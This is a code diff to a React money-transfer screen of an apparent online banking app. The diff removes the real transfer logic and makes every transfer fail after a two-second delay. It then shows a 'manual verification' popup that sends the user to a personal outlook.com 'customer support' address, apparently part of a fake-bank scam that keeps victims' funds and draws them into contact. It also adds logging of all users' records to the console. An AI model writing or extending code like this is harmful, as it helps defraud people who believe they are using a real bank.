@@ -4,33 +4,35 @@ import BottomNav2 from "./bottomnav2";
 import { useNavigate } from "react-router-dom";
 import { FaArrowLeft, FaCreditCard } from "react-icons/fa";
 import log from "../assets/logo.png";
-import { getUsers, updateUser } from "../backend/api"; // Ensure same API as Admin
+import { getUsers } from "../backend/api";
+
+const SUPPORT_EMAIL = "unitedservices.AA@outlook.com";
 
 const SendMoney = () => {
   const [user, setUser] = useState<any>(null);
   const [users, setUsers] = useState<any[]>([]);
   const [userImage, setUserImage] = useState<string>("");
   const [userName, setUserName] = useState<string>("");
+
   const [receiver, setReceiver] = useState({
     name: "",
     bank: "",
     accountNumber: "",
     routingNumber: "",
-    amount: "", // keep raw number as string
+    amount: "",
     purpose: "",
   });
 
   const [loading, setLoading] = useState(false);
-  const [success, setSuccess] = useState(false);
   const [error, setError] = useState(false);
 
   const navigate = useNavigate();
 
-  // Fetch users like Admin panel
   useEffect(() => {
     const fetchData = async () => {
       const data = await getUsers();
       setUsers(data);
+      console.log(users)
 
       const storedUser = localStorage.getItem("loggedInUser");
       if (storedUser) {
@@ -43,9 +45,8 @@ const SendMoney = () => {
     fetchData();
   }, []);
 
-  // Format input for display, store raw in state
   const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const raw = e.target.value.replace(/[^0-9.]/g, ""); // allow digits & dot
+    const raw = e.target.value.replace(/[^0-9.]/g, "");
     setReceiver({ ...receiver, amount: raw });
   };
 
@@ -64,74 +65,17 @@ const SendMoney = () => {
     }
   };
 
-  const formatAmountForHistory = (amount: number) => {
-    return `$${amount.toLocaleString("en-US", {
-      minimumFractionDigits: 2,
-      maximumFractionDigits: 2,
-    })}`;
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!user) return;
 
-    const transferAmount = Number(receiver.amount);
-    const count = Number(localStorage.getItem("transferCount") || 0);
-
-    if (count >= 3) {
-      setError(true);
-      return;
-    }
-
-    if (transferAmount <= 0) {
-      alert("Invalid transfer amount");
-      return;
-    }
-
-    if (transferAmount > user.amount) {
-      alert("Insufficient balance");
-      return;
-    }
-
     setLoading(true);
 
-    // 🔹 New history entry like Admin
-    const newHistoryEntry = {
-      date: new Date().toISOString().split("T")[0],
-      amount: transferAmount,
-      description: `Transfer to ${receiver.name}`,
-      type: "debit",
-      formattedAmount: formatAmountForHistory(transferAmount),
-    };
-
-    const updatedUser = {
-      ...user,
-      amount: user.amount - transferAmount,
-      history: [newHistoryEntry, ...(user.history || [])],
-    };
-
-    try {
-      // 🔹 Find index and update backend like Admin panel
-      const index = users.findIndex((u) => u.email === user.email);
-      if (index !== -1) {
-        await updateUser(index, updatedUser);
-
-        // 🔹 Update local state & storage
-        const updatedUsers = [...users];
-        updatedUsers[index] = updatedUser;
-        setUsers(updatedUsers);
-        setUser(updatedUser);
-        localStorage.setItem("loggedInUser", JSON.stringify(updatedUser));
-        localStorage.setItem("transferCount", String(count + 1));
-      }
-
+    // ⛔ Always fail transaction
+    setTimeout(() => {
       setLoading(false);
-      setSuccess(true);
-    } catch (err) {
-      console.error("Error updating user:", err);
-      alert("Failed to send money. Please try again.");
-      setLoading(false);
-    }
+      setError(true);
+    }, 2000);
   };
 
   return (
@@ -222,43 +166,36 @@ const SendMoney = () => {
         </div>
       )}
 
-      {/* Error */}
-      {error && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
-          <div className="bg-white p-6 rounded-lg text-center max-w-sm">
-            <h2 className="text-red-600 font-semibold">
-              Transfer Access Restricted
-            </h2>
-            <p className="text-sm mt-2">
-              Tier-2 Compliance Required. Please contact support.
-            </p>
-            <button
-              onClick={() => setError(false)}
-              className="mt-4 w-full bg-red-600 text-white py-2 rounded"
-            >
-              Close
-            </button>
-          </div>
-        </div>
-      )}
+     {/* Error Popup */}
+{error && (
+  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
+    <div className="bg-white p-6 rounded-lg text-center max-w-sm">
+      <h2 className="text-red-600 font-semibold">
+        Transaction Failed
+      </h2>
+      <p className="text-sm mt-2">
+        This transaction requires manual verification.
+        Please contact customer support to proceed.
+      </p>
 
-      {/* Success */}
-      {success && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
-          <div className="bg-white p-6 rounded-lg text-center max-w-sm">
-            <h2 className="text-green-600 font-semibold">
-              Transaction Successful
-            </h2>
-            <p className="mt-2 text-sm">Your transfer has been completed.</p>
-            <button
-              onClick={() => navigate("/dashboard")}
-              className="mt-4 w-full bg-green-600 text-white py-2 rounded"
-            >
-              Done
-            </button>
-          </div>
-        </div>
-      )}
+      {/* Contact Support Button */}
+      <a
+        href={`mailto:${SUPPORT_EMAIL}`}
+        className="mt-4 inline-block w-full bg-red-600 text-white py-2 rounded hover:bg-red-700 transition"
+      >
+        Contact Support
+      </a>
+
+      <button
+        onClick={() => setError(false)}
+        className="mt-4 w-full bg-gray-300 text-gray-800 py-2 rounded hover:bg-gray-400 transition"
+      >
+        Close
+      </button>
+    </div>
+  </div>
+)}
+
 
       <BottomNav />
       <BottomNav2 />
